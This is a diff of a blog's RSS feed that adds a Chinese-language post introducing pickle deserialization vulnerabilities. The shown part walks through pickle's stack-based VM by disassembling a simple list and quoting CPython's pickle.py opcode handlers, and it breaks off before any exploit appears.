@@ -1,4 +1,475 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>python on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/python/</link><description>Recent content in python on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 27 May 2022 18:33:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/python/index.xml" rel="self" type="application/rss+xml"/><item><title>2022年5月27日 面试记录</title><link>https://nnnewb.github.io/blog/p/2022-05-27-interview-note/</link><pubDate>Fri, 27 May 2022 18:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/2022-05-27-interview-note/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>python on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/python/</link><description>Recent content in python on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 24 Jun 2022 18:11:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/python/index.xml" rel="self" type="application/rss+xml"/><item><title>pickle反序列化漏洞浅析</title><link>https://nnnewb.github.io/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</link><pubDate>Fri, 24 Jun 2022 18:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>挑了个好捏的软柿子下手，来看下反序列化漏洞一般什么原理。&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;h3 id="概述">概述&lt;/h3>
+&lt;p>Python 是个动态类型且高度灵活的语言，这意味着直接按内存布局序列化基本是没戏的。想序列化一个Python中的实例，很大程度要依靠Python的高度灵活性。&lt;/p>
+&lt;p>pickle 是一种 Python 的序列化库（或者，序列化协议？），其优势是几乎能序列化任何 Python 对象，但为了实现这种优势，pickle 会根据输入而执行指定的函数，从而造成RCE。&lt;/p>
+&lt;p>可以用 &lt;code>fickling&lt;/code> 和 &lt;code>pickletools&lt;/code> 这两个工具分析 pickle 序列化后的字节序列。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139.png"
+width="1587"
+height="433"
+srcset="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139_hu0f0622ef2bea9e4acb18c7285499bd00_36179_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139_hu0f0622ef2bea9e4acb18c7285499bd00_36179_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="序列化简单列表"
+class="gallery-image"
+data-flex-grow="366"
+data-flex-basis="879px"
+>&lt;/p>
+&lt;h3 id="反序列化">反序列化&lt;/h3>
+&lt;p>接着分析下序列化后的这些数据是怎么还原成 Python 对象的。以 &lt;code>pickle.dumps([1,2,3])&lt;/code> 的结果为例，以 &lt;code>pickletools.dis&lt;/code> 还原成字节码，Python 3.7.9 pickle 模块源码 &lt;a class="link" href="https://github.com/python/cpython/blob/13c94747c74437e594b7fc242ff7da668e81887c/Lib/pickle.py" target="_blank" rel="noopener"
+>pickle.py&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
+2: ] EMPTY_LIST
+3: q BINPUT 0
+5: ( MARK
+6: K BININT1 1
+8: K BININT1 2
+10: K BININT1 3
+12: e APPENDS (MARK at 5)
+13: . STOP
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>pickle 反序列化是一个类似基于栈的虚拟机，上面恢复的字节码等于这个虚拟机的汇编指令。上面第一列是偏移值，单位字节。第二、三列理解成指令，第四列自然是操作数。&lt;/p>
+&lt;p>然后我们看 &lt;code>pickle.py&lt;/code> 中如何把上面这些”指令“恢复成 Python 对象。&lt;/p>
+&lt;h4 id="vm模型">vm模型&lt;/h4>
+&lt;p>先看 &lt;code>pickle.py&lt;/code> 中的 &lt;code>_Unpickler&lt;/code> 类，跳转到&lt;code>load&lt;/code>方法。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;Read a pickled object representation from the open file.
+&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;span class="s2"> Return the reconstituted object hierarchy specified in the file.
+&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;span class="c1"># Check whether Unpickler was initialized correctly. This is&lt;/span>
+&lt;span class="c1"># only needed to mimic the behavior of _pickle.Unpickler.dump().&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="nb">hasattr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;_file_read&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">raise&lt;/span> &lt;span class="n">UnpicklingError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Unpickler.__init__() was not called by &amp;#34;&lt;/span>
+&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">.__init__()&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">,))&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_Unframer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file_read&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file_readline&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">metastack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="n">read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>
+&lt;span class="n">dispatch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dispatch&lt;/span>
+&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">raise&lt;/span> &lt;span class="ne">EOFError&lt;/span>
+&lt;span class="k">assert&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bytes_types&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">except&lt;/span> &lt;span class="n">_Stop&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">stopinst&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="n">stopinst&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里已经出现了核心逻辑和最重要的几个属性：&lt;code>stack&lt;/code>、&lt;code>metastack&lt;/code>、&lt;code>dispatch&lt;/code>。&lt;/p>
+&lt;p>&lt;code>stack&lt;/code>顾名思义即可，&lt;code>dispatch&lt;/code>则是一个 opcode 到 &lt;code>_Unpickler&lt;/code> 方法的映射字典。opcode 定义在这个文件的 98~179 行。&lt;/p>
+&lt;p>在重要数据结构初始化后，接下来是主循环，从输入中读&lt;code>key&lt;/code>（指令），派发执行。&lt;/p>
+&lt;h4 id="proto">PROTO&lt;/h4>
+&lt;p>回顾上一节的字节码，我们从 &lt;code>PROTO 3&lt;/code> 开始看 pickle 如何处理这些指令。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_proto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">proto&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">HIGHEST_PROTOCOL&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;unsupported pickle protocol: &lt;/span>&lt;span class="si">%d&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">proto&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">proto&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">PROTO&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_proto&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>PROTO 3&lt;/code> 指令读了操作数 &lt;code>3&lt;/code> 并赋值。注意看&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
+2: ] EMPTY_LIST
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>PROTO 3&lt;/code> 正好 2 字节，在&lt;code>load&lt;/code>中读取的第一个字节表示&lt;code>proto&lt;/code>指令，操作数&lt;code>3&lt;/code>是第二个字节。&lt;/p>
+&lt;h4 id="empty_list">EMPTY_LIST&lt;/h4>
+&lt;p>&lt;code> EMPTY_LIST&lt;/code> 我们继续看这个指令。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_empty_list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">([])&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">EMPTY_LIST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_empty_list&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>self.append&lt;/code> 是 &lt;code>self.stack.append&lt;/code> 的别名，我们在 &lt;code>load&lt;/code> 函数定义里已经知道了这一点。这一步往栈中压了一个空的列表&lt;code>list&lt;/code>。&lt;/p>
+&lt;h4 id="binput">BINPUT&lt;/h4>
+&lt;p>&lt;code>BINPUT 0&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_binput&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;negative BINPUT argument&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">memo&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">BINPUT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_binput&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在&lt;code>PUT&lt;/code>系列指令的定义处有注释：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">PUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;p&amp;#39;&lt;/span> &lt;span class="c1"># store stack top in memo; index is string arg&lt;/span>
+&lt;span class="n">BINPUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> &lt;span class="c1"># &amp;#34; &amp;#34; &amp;#34; &amp;#34; &amp;#34; ; &amp;#34; &amp;#34; 1-byte arg&lt;/span>
+&lt;span class="n">LONG_BINPUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span> &lt;span class="c1"># &amp;#34; &amp;#34; &amp;#34; &amp;#34; &amp;#34; ; &amp;#34; &amp;#34; 4-byte arg&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>BINPUT&lt;/code> 指令的含义是将栈顶变量（空列表）放到 &lt;code>memo&lt;/code> 中（理解为寄存器？）。这个指令的操作数就相当于是寄存器名了。&lt;/p>
+&lt;h4 id="mark">MARK&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
+2: ] EMPTY_LIST
+3: q BINPUT 0
+5: ( MARK
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">MARK&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="c1"># push special markobject on stack&lt;/span>
+&lt;span class="c1"># ...&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">load_mark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">metastack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
+&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MARK&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_mark&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>MARK&lt;/code> 指令将栈压到了 &lt;code>metastack&lt;/code> 中，替换了当前栈。应该是一个类似栈帧的机制。&lt;/p>
+&lt;h4 id="binint">BININT&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">BININT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;J&amp;#39;&lt;/span> &lt;span class="c1"># push four-byte signed int&lt;/span>
+&lt;span class="n">BININT1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;K&amp;#39;&lt;/span> &lt;span class="c1"># push 1-byte unsigned int&lt;/span>
+&lt;span class="n">LONG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;L&amp;#39;&lt;/span> &lt;span class="c1"># push long; decimal string argument&lt;/span>
+&lt;span class="n">BININT2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;M&amp;#39;&lt;/span> &lt;span class="c1"># push 2-byte unsigned int&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>BININT&lt;/code> 系列的指令都是压栈一个操作数。在&lt;code>MARK&lt;/code>指令后，是连续的三条&lt;code>BININT1&lt;/code>指令。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 5: ( MARK
+6: K BININT1 1
+8: K BININT1 2
+10: K BININT1 3
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="appends">APPENDS&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 10: K BININT1 3
+12: e APPENDS (MARK at 5)
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
